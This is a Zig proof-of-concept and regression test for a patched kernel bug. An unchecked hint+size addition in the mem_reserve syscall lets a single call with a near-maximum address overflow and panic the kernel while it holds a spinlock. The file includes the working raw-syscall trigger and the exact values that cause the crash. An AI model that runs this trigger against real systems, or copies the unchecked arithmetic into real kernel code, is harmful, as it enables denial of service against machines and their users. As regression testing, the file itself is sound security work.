// PoC for ccb3c25: sysMemReserve missing hint+size overflow check.
//
// Pre-patch: sysMemReserve forwarded (hint, size) straight into
// VirtualMemoryManager.reserve, which evaluated `hint.addr + size` as
// a bare u64 add inside an and-chain. With hint near ~0 and a non-zero
// page-aligned size, the first three conjuncts (non-zero, page-aligned,
// hint >= range_start) all hold, the bare add overflows, and the
// kernel takes a Debug/ReleaseSafe integer-overflow panic *while
// holding the vmm spinlock*. Single-syscall ring-0 DoS for any process
// holding mem_reserve rights — and the root service has it.
//
// Post-patch: sysMemReserve performs std.math.add(hint, size) up front
// and partition-checks both endpoints, returning E_INVAL (-1) cleanly.
//
// Differential: pre-patch the kernel panics before any POC line is
// printed (serial output ends in a kernel PANIC banner). Post-patch
// the syscall returns E_INVAL and the program prints
// "POC-ccb3c25: PATCHED". Grep both "PANIC" and "POC-ccb3c25" in
// the serial log to disambiguate.

const lib = @import("lib");
const syscall = lib.syscall;
const arch = @import("builtin").cpu.arch;

fn rawMemReserve(hint: u64, size: u64, max_perms_bits: u64) i64 {
    return switch (arch) {
        .x86_64 => asm volatile ("syscall"
            : [ret] "={rax}" (-> i64),
            : [num] "{rax}" (@as(u64, @intFromEnum(syscall.SyscallNum.mem_reserve))),
              [a0] "{rdi}" (hint),
              [a1] "{rsi}" (size),
              [a2] "{rdx}" (max_perms_bits),
            : .{ .rcx = true, .r11 = true, .memory = true }),
        else => unreachable,
    };
}

pub fn main(_: u64) void {
    // hint near the top of the 64-bit address space, page-aligned, well
    // above any plausible user range_start. size = 0x10000 (16 pages).
    // hint + size wraps u64 to 0x000000000000F000.
    //
    // Pre-patch: vmm.reserve evaluates `hint.addr + size` as a bare u64
    // add => integer-overflow panic under ReleaseSafe/Debug while the
    // vmm spinlock is held. Kernel dies before this PoC reaches its
    // print path.
    //
    // Post-patch: sysMemReserve runs std.math.add up front, the add
    // overflows, the catch arm returns E_INVAL.
    const hint: u64 = 0xFFFFFFFFFFFFF000;
    const size: u64 = 0x10000;
    // max_perms_bits = read|write; exact value is irrelevant — we never
    // reach the rights validation on the vulnerable path.
    const max_perms_bits: u64 = 0x3;

    const ret = rawMemReserve(hint, size, max_perms_bits);

    if (ret == -1) {
        syscall.write("POC-ccb3c25: PATCHED (mem_reserve overflow -> E_INVAL)\n");
    } else {
        syscall.write("POC-ccb3c25: VULNERABLE (mem_reserve overflow returned non-EINVAL)\n");
    }
    syscall.shutdown();
}
